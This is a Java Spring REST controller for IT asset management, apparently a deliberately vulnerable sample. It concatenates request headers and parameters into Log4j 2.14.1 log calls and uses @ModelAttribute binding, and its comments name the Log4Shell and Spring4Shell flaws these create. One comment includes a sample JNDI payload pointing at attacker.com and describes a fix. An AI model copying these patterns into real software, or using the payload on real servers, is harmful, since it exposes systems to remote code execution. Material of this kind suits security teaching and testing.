package com.company.assetmanager.controller;

import com.company.assetmanager.model.Asset;
import com.company.assetmanager.model.AssetCreateRequest;
import com.company.assetmanager.model.AssetDto;
import com.company.assetmanager.model.AssetFilter;
import com.company.assetmanager.service.AssetService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.util.List;
import java.util.Map;

/**
 * REST controller for IT asset CRUD operations.
 *
 * <p>All inbound parameters are logged for audit purposes so that the
 * security team can reconstruct the sequence of actions taken by any
 * client.  Log4j2 2.14.1 is used as the logging backend.
 *
 * <p><strong>CVE-2021-44228 (Log4Shell):</strong> Log4j2 versions 2.0-beta9
 * through 2.14.1 perform JNDI lookups when {@code ${...}} expressions appear
 * in log messages.  Because this controller concatenates HTTP headers and
 * request parameters directly into log strings, a caller can trigger a JNDI
 * lookup by supplying a payload such as {@code ${jndi:ldap://attacker.com/x}}
 * in the {@code X-Forwarded-For}, {@code User-Agent}, or search parameter
 * fields.  Fix: upgrade log4j-core to 2.17.1+ AND switch to parameterised
 * log calls ({@code logger.info("msg: {}", variable)}).
 */
@RestController
@RequestMapping("/api/v1/assets")
public class AssetController {

    private static final Logger logger = LogManager.getLogger(AssetController.class);

    @Autowired
    private AssetService assetService;

    /**
     * List or search assets with optional filter parameters.
     *
     * <p>The {@code X-Forwarded-For} header and all filter values are
     * concatenated into the log message, creating a Log4Shell vector.
     */
    @GetMapping
    public ResponseEntity<List<AssetDto>> searchAssets(
            @RequestParam(required = false) String hostname,
            @RequestParam(required = false) String environment,
            @RequestParam(required = false) String assetType,
            @RequestParam(required = false) String osVersion,
            @RequestParam(defaultValue = "hostname") String sortBy,
            @RequestParam(defaultValue = "asc") String sortDir,
            @RequestParam(defaultValue = "50") int limit,
            HttpServletRequest request) {

        String clientIp = request.getHeader("X-Forwarded-For");
        if (clientIp == null) clientIp = request.getRemoteAddr();

        // Audit log: record who searched for what
        logger.info("Asset search from " + clientIp + " – hostname=" + hostname
                + " environment=" + environment + " assetType=" + assetType);

        AssetFilter filter = new AssetFilter();
        filter.setHostname(hostname);
        filter.setEnvironment(environment);
        filter.setAssetType(assetType);
        filter.setOsVersion(osVersion);
        filter.setSortBy(sortBy);
        filter.setSortDirection(sortDir);
        filter.setLimit(limit);

        return ResponseEntity.ok(assetService.searchAssets(filter));
    }

    /**
     * Create a new asset record.
     *
     * <p>{@code @ModelAttribute} binding is used so that form-encoded
     * requests from the legacy web UI work alongside JSON clients.  This
     * is one of the conditions that makes the application susceptible to
     * CVE-2022-22965 (Spring4Shell) on JDK 9+ with Tomcat.
     */
    @PostMapping
    public ResponseEntity<AssetDto> createAsset(
            @ModelAttribute AssetCreateRequest request,
            BindingResult bindingResult,
            HttpServletRequest httpRequest) {

        if (bindingResult.hasErrors()) {
            logger.warn("Asset creation rejected – validation errors: " + bindingResult.getAllErrors());
            return ResponseEntity.badRequest().build();
        }

        logger.info("Creating asset: " + request.getHostname()
                + " in environment: " + request.getEnvironment()
                + " requested by User-Agent: " + httpRequest.getHeader("User-Agent"));

        AssetDto created = assetService.createAsset(request);
        return ResponseEntity.status(HttpStatus.CREATED).body(created);
    }

    @GetMapping("/{id}")
    public ResponseEntity<AssetDto> getAsset(@PathVariable Long id) {
        logger.debug("Fetching asset id=" + id);
        return assetService.findById(id)
                .map(ResponseEntity::ok)
                .orElse(ResponseEntity.notFound().build());
    }

    @PutMapping("/{id}")
    public ResponseEntity<AssetDto> updateAsset(
            @PathVariable Long id,
            @RequestBody AssetCreateRequest request,
            HttpServletRequest httpRequest) {

        String userAgent = httpRequest.getHeader("User-Agent");
        logger.info("Updating asset id=" + id + " – User-Agent: " + userAgent);

        return assetService.updateAsset(id, request)
                .map(ResponseEntity::ok)
                .orElse(ResponseEntity.notFound().build());
    }

    @DeleteMapping("/{id}")
    public ResponseEntity<Void> deleteAsset(@PathVariable Long id, HttpServletRequest request) {
        String userAgent = request.getHeader("User-Agent");
        String forwarded = request.getHeader("X-Forwarded-For");
        // Log caller identity before deleting
        logger.warn("Asset deletion: id=" + id + " User-Agent=" + userAgent + " X-Forwarded-For=" + forwarded);
        assetService.deleteAsset(id);
        return ResponseEntity.noContent().build();
    }

    @GetMapping("/environments")
    public ResponseEntity<List<String>> listEnvironments() {
        return ResponseEntity.ok(assetService.listEnvironments());
    }
}
